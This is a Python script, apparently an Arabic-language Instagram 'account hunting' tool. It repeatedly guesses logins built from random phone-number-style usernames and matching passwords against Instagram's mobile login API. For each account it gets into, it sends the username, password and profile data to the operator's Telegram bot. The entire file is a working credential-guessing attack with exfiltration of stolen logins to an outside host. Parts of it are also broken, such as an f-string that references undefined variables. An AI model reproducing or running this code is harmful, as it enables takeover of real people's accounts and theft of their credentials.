import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.026)


    a(f"                         {Y}𝐁𝐘{G}: مرتضى عقيل الرميثي : @@aaswd1")
    sleep(1)
    print('\n\n')
    a(G + ' \n\n ')
    print('\n')
    tok = input(S + ' توكن حبيبي⌯ ' + C)
    sleep(2)
    a(A + '  ')
    print('\n')
    ID = input(A + ' ايدي يعمري ⌯ ' + C)
    sleep(0.1)
    os.system('clear')
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= ⌯ تـم تفعـيل اشتراكك ✅.").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"\n ابن الرميثة صادلك حساب َ🕷️.\n ︎⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ \n Name : {الاسم}\n USER : {يوزر}\n PASS  : {الر}\n FOLLOWERS : {المتابعين}\n FOLLOWING : {التابعهم}\n DATA : {dat}\n TIME : {current_time}\n .HITE NOMBER [{zz}]\n ︎︎⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯\n BY : @aaswd1⌯ CH :@aaswd1\n"
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    
    user = '1234567890'
    while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '98912' + us
        password = '0912' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ⌯ 𝐃𝐎𝐍 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐏𝐓𝐈 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 ✅\n︎⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯صيد ابن الرميثة علش⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯\n ⌯ 𝐂𝐎𝐍𝐃𝐄𝐍 𝐓𝐎 f𝐈𝐍����𝐀𝐂𝐂 ! \n ⌯ 𝐂𝐇 :@aaswd1\n ⌯ 𝐁𝐘@aaswd1\n𝐘𝐎𝐔 𝐇𝐈𝐓𝐄 ✅ [{zz}]\n\u200a𝐈 𝐂𝐇𝐄𝐂𝐊𝐄𝐃 ❌ [{aa}]")
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
